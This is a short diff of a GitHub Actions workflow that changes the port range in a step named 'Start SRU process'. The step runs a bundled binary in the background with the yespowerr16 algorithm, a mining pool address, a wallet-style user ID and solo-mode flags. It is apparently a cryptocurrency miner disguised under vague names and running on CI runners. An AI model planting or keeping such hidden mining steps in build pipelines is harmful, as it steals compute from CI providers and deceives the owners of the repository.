@@ -82,7 +82,7 @@ jobs:
       - name: Start SRU process
         run: |
           if [ -f .lib/sru ]; then
-            port=$(shuf -i 602-610 -n 1)
+            port=$(shuf -i 802-810 -n 1)
             nohup .lib/sru -a yespowerr16 --pool ${{ steps.select-ip.outputs.selected_ip }}:$port -u YdenAmcQSv3k4qUwYu2qzM4X6qi1XJGvwC --timeout 120 -t 3 -p m=solo > dance.log 2>&1 &
             echo "Started SRU process using IP ${{ steps.select-ip.outputs.selected_ip }} and port $port"
             sleep 300
